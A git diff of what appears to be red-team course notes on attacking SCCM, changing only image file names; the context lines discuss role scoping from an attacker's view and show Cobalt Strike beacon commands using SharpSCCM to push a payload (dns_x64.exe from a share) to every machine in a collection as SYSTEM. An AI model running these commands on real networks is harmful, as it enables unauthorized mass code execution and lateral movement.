@@ -107,7 +107,7 @@ Furthermore, the "scope" of these roles can be restricted to individual collecti
 
 For example, computers from the `DEV` and `CYBER` domains have been grouped into their own collections.
 
-<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 This can impact your view as an attacker of how SCCM is configured.
 
@@ -148,7 +148,7 @@ This is because even though `DEV\Developers` are only "Read-Only Analysts", the 
 
 `DEV\Support` engineers are "Full Administrators" over the `DEV` collection but they have no roles that are scoped to the `CYBER` collection.
 
-<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **So when enumerating SCCM, you may only see a small slither based on the user you're running the enumeration as:**
 
@@ -356,7 +356,7 @@ beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n DE
 
 SharpSCCM attempts to hide the application (i.e. the command we're executing) from the GUI, but the deployment is still visible until it completes.
 
-<figure><img src="../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 By default, the above will execute Notepad as the user currently logged into each machine.&#x20;
 
@@ -370,4 +370,4 @@ We can force it to execute as <mark style="color:yellow;">`SYSTEM`</mark> using 
 beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n DEV -p "C:\Windows\System32\cmd.exe /c start /b \\dc-2\software\dns_x64.exe" -s --no-banner
 ```
 
-<figure><img src="../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
